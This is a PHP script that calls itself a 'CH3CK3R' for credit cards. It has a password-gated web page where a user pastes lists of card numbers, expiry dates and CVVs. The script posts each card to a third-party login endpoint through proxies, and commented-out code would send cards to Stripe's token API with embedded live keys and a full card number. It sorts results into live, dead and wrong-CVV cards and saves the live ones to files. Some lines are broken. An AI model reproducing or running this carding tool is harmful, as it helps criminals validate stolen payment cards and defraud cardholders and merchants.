	<?php
	error_reporting(0);
	session_start();
	set_time_limit(9999999);
	$login='';
	$password='';
	$auth=1;
	$style='<STYLE>BODY{background-color: #000000; background: url(http://www.zemwallpapers.com/wp-content/uploads/2015/07/Full-Hd-Widescreen-Wallpapers-1920X1080-7.jpg);color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #121214;font-size: 8pt;color: #C1C1C7;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
	$header='<html><head><link rel="SHORTCUT ICON" href=""><title>CH3CK3R Vip !</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
	$footer='</body></html>';
	if(@$_POST['action']=="exit")unset($_SESSION['an']);
	if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';
	if($_SESSION['an']==0){
	 echo $header;
	echo '<br><center><tr><td colspan="2" align="center"><strong>CH3CKER SaadoVIP AREA DE LOGIN </strong></td></tr><br><br>';
	echo '<table><form method="POST"><tr><td>Usuario: </td><td><input type="text" name="login" value=""></td></tr><tr><td>Senha: </td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="            ENTRAR           "></td></tr></form></table></center>'; 
	echo $footer;
	exit;}
	?>

	SET NAMES utf8
	mysql_set_charset ("utf8")
	<meta charset="utf-8">

		
		<title>CH3CK3R [ INFOCC ]</title>
		
		<style>
		body, table{
			   
	background: url(http://www.zemwallpapers.com/wp-content/uploads/2015/07/Full-Hd-Widescreen-Wallpapers-1920X1080-7.jpg)

		}
		</style>
		<?php
		error_reporting(0);
		?>                                                             
		<?php
		error_reporting(0);
		set_time_limit(0);
		function _curl($url,$post="",$usecookie = false) {  
				$ch = curl_init();
				if($post) {
						curl_setopt($ch, CURLOPT_POST ,1);
						curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
				}
				// curl_setopt( $ch, CURLOPT_HTTPHEADER, array("Authorization: Basic UTIzNzM3X1BVQl80ZGRwYThodTg3anBycTlqNjdpMjZpejN0cTg5NDc0cjlwZTljaXlydG5iYzdzM2toa21hd2M2eGtxY3g6"));
				curl_setopt($ch, CURLOPT_URL, $url);
				// $proxy = '184.105.143.66:3128';
				// curl_setopt($ch, CURLOPT_PROXY, $proxy);

				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36');

				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				// curl_setopt($ch, CURLOPT_REFERER, 'https://js.stripe.com/v3/controller-6ac8ab29d2d23299833a1b3f50983861.html');

				if ($usecookie) {
				curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie);
				curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);    
				}
				curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
				curl_setopt($ch, CURLOPT_HEADER, 1);

				$result=curl_exec ($ch);
				curl_close ($ch);
				return $result;
		}
		 
		 
		 
		function percent($num_amount, $num_total) {
		$count1 = $num_amount / $num_total;
		$count2 = $count1 * 100;
		$count = number_format($count2, 0);
		return $count;
		}
		 
		function getStr($string,$start,$end){
				$str = explode($start,$string);
				$str = explode($end,$str[1]);
				return $str[0];
		}
		 
		function checkMon($date,$type){
				$len = strlen($date);
				if ($type == 2){
						if($len == 2){
								return $date;
						}
						elseif($len == 1){
								switch($date){
										case '1':  $date='01'; break;
										case '2':  $date='02'; break;
										case '3':  $date='03'; break;
										case '4':  $date='04'; break;
										case '5':  $date='05'; break;
										case '6':  $date='06'; break;
										case '7':  $date='07'; break;
										case '8':  $date='08'; break;
										case '9':  $date='09'; break;
								}
						}
						return $date;
				}
				elseif ($type == 1){
						if($len == 2){
								switch ($date){
										case '01':  $date='1'; break;
										case '02':  $date='2'; break;
										case '03':  $date='3'; break;
										case '04':  $date='4'; break;
										case '05':  $date='5'; break;
										case '06':  $date='6'; break;
										case '07':  $date='7'; break;
										case '08':  $date='8'; break;
										case '09':  $date='9'; break;
										case '10': $date='10'; break;
										case '11': $date='11'; break;
										case '12': $date='12'; break;
								}
								return $date;
						}
						elseif($len == 1) return $date;
				}
				else return false;
		}
		 
		 
		function checkYear($date,$type){
				$len = strlen($date);
				if($type == 4){
						if($len == 4) return $date;
					   elseif($len == 2) return "20".$date;
	return $date;

				}
				elseif($type == 2){
						if($len == 2) return $date;
						elseif($len == 4) return substr($date,-2);
	return $date;
				}
				else return false;
		}
		 
		function multi_explode($pattern, $string, $standardDelimiter = ':'){
			$string = preg_replace(array($pattern, "/{$standardDelimiter}+/s"), $standardDelimiter, $string);
			return explode($standardDelimiter, $string);
		}
		 
		function info($ccline,$type){
				$iscvv = 1;
				$pattern = '/[:\|\\\\\/\s]/';
				$line = multi_explode($pattern,$ccline);
			   
				$typemy = explode(" ",$type);
				$typem = strlen($typemy[0]);
				$typey = strlen($typemy[1]);
			   
				$amex = "american_express";
				$visa = "visa";
				$mast = "master";
				$disc = "Discover";
		 
				foreach($line as $col){
						if(is_numeric($col)){
								switch(strlen($col)){

										case 14:
												if(substr($col,0,1)==3){
														$ccnum['num'] = $col;
														$ccnum['type'] = $amex;
												}
												break;

										case 15:
												if(substr($col,0,1)==3){
														$ccnum['num'] = $col;
														$ccnum['type'] = $amex;
												}
												break;


										case 16:
												switch(substr($col,0,1)){
														case '4':
																$ccnum['num'] = $col;
																$ccnum['type'] = $visa;
																break;
														case '5':
																$ccnum['num'] = $col;
																$ccnum['type'] = $mast;
																break;
														case '6':
																$ccnum['num'] = $col;
																$ccnum['type'] = $disc;
																break;
												}
												break;
										case 1:
												if (($col >= 1) and ($col <=12) and (!isset($ccnum['mon']))) $ccnum['mon'] = checkMon($col,$typem); break;
										case 2:
												if (($col >= 1) and ($col <=12) and (!isset($ccnum['mon']))){
														$ccnum['mon'] = checkMon($col,$typem);
												}
												elseif (($col >= 9) and ($col <= 19) and (isset($ccnum['mon'])) and (!isset($ccnum['year'])))    $ccnum['year'] = checkYear($col,$typey);
												break;
										case 4:
												if (($col >= 2009) and ($col <= 2019) and (isset($ccnum['mon'])))    $ccnum['year'] = checkYear($col,$typey);
												elseif ((substr($col,0,2) >= 1) and (substr($col,0,2) <=12) and (substr($col,2,2)>= 9) and (substr($col,2,2) <= 19) and (!isset($ccnum['mon'])) and (!isset($ccnum['year']))){
														$ccnum['mon'] = checkMon(substr($col,0,2),$typem);
														$ccnum['year'] = checkYear(substr($col,-2),$typey);
												}
												else $ccv['cv4'] = $col;
												break;
										case 6:
												if ((substr($col,0,2) >= 1) and (substr($col,0,2) <=12) and (substr($col,2,4)>= 2009) and (substr($col,2,4) <= 2019)){
								$ccnum['mon'] = checkMon(substr($col,0,2),$typem);
														$ccnum['year'] = checkYear(substr($col,-2),$typey);
							}
							break;
										case 3:
												$ccv['cv3'] = $col;
							break;
								}
						}
				}
				if($iscvv == 1){
						if ($ccnum['type'] == $amex) $ccnum['cvv'] = $ccv['cv4'];
						else $ccnum['cvv'] = $ccv['cv3'];
						return $ccnum;
				}
			else return $ccnum;
		}
		function inStr($s,$as){
				$s=strtoupper($s);
				if(!is_array($as)) $as=array($as);
				for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
				return false;
		}
		 
		if ($_POST['cclist']){
						global $cookie;
						$cookie = tempnam('tmp','avo'.rand(1000000,9999999).'tmp.txt');
		 
						$cclive = "";
						$ccdie = "";
						$ccerr = "";
						$cccant = "";
						$uncheck = "";
						$limit = "";
					   
						$cclist = trim($_POST['cclist']);

						$cclist = str_replace(array("\\\"","\\'"),array("\"","'"),$cclist);
						$cclist = str_replace("\r\r","\r",$cclist);
						$cclist = str_replace("\n\n","\n",$cclist);
						$cclist = explode("\n",$cclist);
		 

			   


						$STT = 0;
						$TOTAL = count($cclist);
						$handle = fopen("proxies.txt", "r");
						for($i=0;$i<count($cclist);$i++){  


					$ex2 = explode('|',$cclist[$i]);
					$ctype = $ex2[0];
					$ccn = $ex2[0];
					$ccmon = $ex2[1];
					$ccyear = $ex2[2];
					$cvv = $ex2[3];
						  
								$numr = rand(50,5000);
									if ($handle) {
										$line = fgets($handle);


								}
								// curl_setopt($ch, CURLOPT_PROXY, $line);





								if ($ccn){
										$STT++;

			   //    $linktoken = "https://api.stripe.com/v1/tokens";
				  // $posttoken = "card[number]=$ccn&card[exp_month]=08&card[exp_year]=21&guid=9825b607-07b7-464a-bcd6-7fb61a92c812&muid=3fbc0877-fde0-4982-a043-02e32469ccbe&sid=816ec604-9292-446f-b683-49587a116fa3&payment_user_agent=stripe.js%2Fe64f557f%3B+stripe-js-v3%2Fe64f557f&referrer=https%3A%2F%2Fwww.quadrotech-it.com%2Fpay%2F&key=pk_live_vU43kZPoxkBEYK1gKikea06A&pasted_fields=number";

				  // $posttoken = "time_on_page=14520&pasted_fields=number&guid=c272a135-d50d-4af9-a925-a600b588836a&muid=67be2aa4-41d7-41b2-b3e3-bd329c935201&sid=52eea687-39de-4183-8cb1-d5fd83dafb8d&key=pk_live_WamADVxSFsqRTKshv9bljRwF&payment_user_agent=stripe.js%2F9dc17ab&card[name]=Ofer+Peler&card[number]=$ccn&card[exp_month]=10&card[exp_year]=2019";

				  // $s = _curl($linktoken,$posttoken,$cookie);
				  // //echo $s;
				  // $tkn1 = substr($s,629,28);
				  // echo $s;
				  // echo "BB" . $tkn1 . "BB";


$randuser = rand
				$randAm = rand(100,10000000);
				$randAmout = rand(5,10);

				$randEmail ="sadi" . $randAm . "@" . $randAm . ".com";


				// $linktoken1 = "https://api.stripe.com/v1/tokens";
			  //   $posttoken1 = "time_on_page=2035011&pasted_fields=number&guid=2e6dd939-1487-4009-abad-b8eca6d938e9&muid=71798674-687f-4e6d-83f1-d811501bf669&sid=9981a9bd-4c84-4dc3-817a-27b32b545c97&key=pk_live_fFoe9qqF4TnqEAxPkUujHU3M&payment_user_agent=stripe.js%2F9dc17ab&card[number]=5189540730316848&card[exp_month]=04&card[exp_year]=2021&card[name]=Ofer+Pelr&card[address_zip]=99903";
				//              $s = _curl($linktoken1,$posttoken1,$cookie);
				//              echo $s;
				//                          $tkn1 = substr($s,-27,18);


		

		$date = $ccmon . $ccyear;
	//	echo $date;
	//echo "<br>";
	echo $ccyear;
			  $linka = "https://www.clientam.com/sso/Login";
			   $posta = "USER=$ccn";








					 $s = _curl($linka,$posta,$cookie);
					 
					 
					 
					 
						if(inStr($s,"004") || InStr($s,"0000000")){
														echo "$STT/$TOTAL | <font color=red>Die | ".$cclist[$i]." "." | SaadoVIP\n</font><br>";  
														$ccdie .= $cclist[$i]."\n";
	 $handle = fopen("ccd.txt", "a");
				fwrite($handle, $cclist[$i]);
			   //echo $s;

												}
	elseif(inStr($s,"418") || InStr($s,"301")){
														echo"<font color=red>$STT/$TOTAL | 
	cvv wrong | ".$cclist[$i]." "." | SaadoVIP\n</font><br>";
														$ccinva .= $cclist[$i]."\n";
	//echo $s;
												}
												else{
													if (inStr($s,"000")){
														echo "<font color=Green>$STT/$TOTAL | Paid 2 shekel > Live | ".$cclist[$i]." "." | SaadoVIP\n</font><br>";
														$cclive .= $cclist[$i]."\n" ;
	  $handle = fopen("511.txt", "a");
				fwrite($handle, $cclist[$i]);
			//	 echo $s;
			//return ;

														}
												else {

													   echo "<font color=Green>$STT/$TOTAL | Love | ".$cclist[$i]." "." | SaadoVIP\n</font><br>";

													   // $handle = fopen("csrf.txt", "a");
													   // fwrite($handle,$s);
													   // $file = file_get_contents('csrf.txt');

													   //                 $csrf = substr($file,6989,55);
													   //                 echo $file;
																   //  echo $s;



	}



												}
												unlink($cookie);
											   
											   
										}
						}
						unlink($cookie);
						$per1 = percent(count(explode("\n",$cclive))-1,count($cclist));
						$per2 = percent(count(explode("\n",$ccdie))-1,count($cclist));
						$per3 = percent(count(explode("\n",$ccinva))-1,count($cclist));
						$per4 = percent(count(explode("\n",$ccexp))-1,count($cclist));
						$per5 = percent(count(explode("\n",$cccant))-1,count($cclist));
						$per6 = percent(count(explode("\n",$limit))-1,count($cclist));

						echo "<center>";
						if($cclive!=""){
								echo "<h2><font color=Green>InfoCC Live</font>$per1% (".(count(explode("\n",$cclive))-1)."/".count($cclist).")</h2>";
								echo "<textarea wrap=off rows=10 style=\"width:90%\">$cclive</textarea><br>";
						}
						if($ccdie!=""){
								echo "<h2><font color=Red>InfoCC Die</font>$per2 % (".(count(explod ("\n", $ccdie))-1)."/".count($cclist).")</h2>";
								echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccdie</textarea><br>";
						}
						if($ccinva!=""){
								echo "<h2><font color=red>InfoCC Invalid</font> $per3 %(".(count(explode("\n",$ccinva))-1)."/".count($cclist).")</h2>";
								echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccinva</textarea><br>";
						}
						if($ccexp!=""){
								echo "<h2><font color=red>Exp</font> $per4 % (".(count(explode("\n",$ccexp))-1)."/".count($cclist).")</h2>";
								echo "<textarea wrap=off rows=10 style=\"width:90%\">$ccexp</textarea><br>";
						}
						if($cccant!=""){
								echo "<h2><font color=orange>Checker CCs</font> $per5 % (".(count(explode("\n",$cccant))-1)."/".count($cclist).")</h2>";
								echo "<textarea wrap=off rows=10 style=\"width:90%\">$cccant</textarea><br>";
						}
		 
		}
		 
		else{
		?>
		<form method="POST" action="">
			  <fieldset>
				  <legend></legend>
					<form action="" method=post name=f>
		 
	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">

	<!-- Optional theme -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">

	<!-- Latest compiled and minified JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>

			   <center>
			 
	<br>
				<textarea id="cclist" name="cclist" class="textarea" style="width: 900px; height: 200px"></textarea> 
	<br>
	<BR>
	<input  style="width: 200px; height: 40px" class="btn btn-success" type=submit name=submit value="CHECK">

		 </center>
				</p>
		 
				</form>
		</fieldset>
				<?php }?>